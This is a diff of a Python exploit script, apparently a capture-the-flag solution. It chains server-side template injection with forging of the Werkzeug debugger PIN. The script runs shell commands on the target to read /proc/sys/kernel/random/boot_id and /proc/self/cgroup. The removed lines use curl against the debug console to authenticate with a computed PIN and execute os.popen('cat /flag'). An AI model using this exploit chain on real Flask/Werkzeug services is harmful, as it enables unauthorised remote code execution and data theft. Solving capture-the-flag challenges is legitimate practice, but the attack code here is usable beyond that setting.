@@ -26,8 +26,6 @@ def get_uuid_node():
 def get_machine_id():
     t = ssti("cat /proc/sys/kernel/random/boot_id").split("(b&#39;")[1].split("\\n")[0]
     t1 = ssti("cat /proc/self/cgroup").split("/")[2].split("\\n")[0]
-    #match = re.search(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}", t)
-    #match = t.split("(b&#39;")[1].split("\\n")[0]
     return t + t1
 
 def generate_pin():
@@ -70,15 +68,6 @@ def generate_pin():
             rv = num
     return rv
 
-#def pinauth():
-    #res = ssti(f"curl%20-G%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={secret()}%20--data-urlencode%20frm=0%20--data-urlencode%20cmd=pinauth%20--data-urlencode%20pin={generate_pin()}")
-    #return re.findall(r"__wzd\S*[^\W]",res)[0]
-
-#def get_flag():
-    #print("p : " + pinauth())
-    #print("s : " + secret())
-    #res = ssti(f"curl%20-G%20-b%20'{pinauth()}'%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={secret()}%20--data-urlencode%20frm=0%20--data-urlencode%20'''cmd=__import__(%5C%22os%5C%22).popen(%5C%22cat%20%2Fflag%5C%22).read();'''")
-    #return re.findall(r"BISC\{.*?\}",res)[0]
 
 def get_flag():
     s = secret()
